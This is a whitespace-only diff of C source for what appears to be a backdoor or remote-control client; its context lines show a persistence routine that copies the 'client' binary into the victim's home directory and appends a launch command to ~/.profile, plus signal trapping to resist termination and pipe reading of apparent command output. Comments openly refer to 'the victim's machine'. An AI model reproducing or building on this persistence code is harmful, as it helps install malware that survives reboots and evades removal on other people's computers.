@@ -15,11 +15,11 @@ void kill_handler(int sig)
 
 int presistence(char *get_path, FILE *fp)
 {
-		
+
     char chunk[128];
     int len = strlen(get_path) -8;
     get_path[len] = 0; //get_path without ".profile"
-		
+
     //copy the executable to home directory
     char command[50] = "cp client ";
     strcat(command, get_path);
@@ -29,7 +29,7 @@ int presistence(char *get_path, FILE *fp)
     //check if .profile can be accessed
     if(fp == NULL)
         {
-		
+
 	return 0;
 	}
     //check if our command is already written there
@@ -48,7 +48,7 @@ int presistence(char *get_path, FILE *fp)
 
 int main(void)
 {
-   
+
    //get the .profile file path for the victim's machine
     FILE *home_path = popen("echo $HOME/.profile","r");;
     char get_path[50];
@@ -57,7 +57,7 @@ int main(void)
 
    //open .profile file in append mode
     FILE *profile  = fopen(get_path, "a+");
-    presistence(get_path, profile); 
+    presistence(get_path, profile);
 
    //LEAVE COMMENTED DURING DEV
     signal(SIGINT, kill_handler);
@@ -104,7 +104,7 @@ int main(void)
           // Place our character from the pipe into the buffer
           buffer[length] = character_read;
           length++;
-          
+
           // Increase the buffer size if needed
           if (length == strlen(buffer))
           {
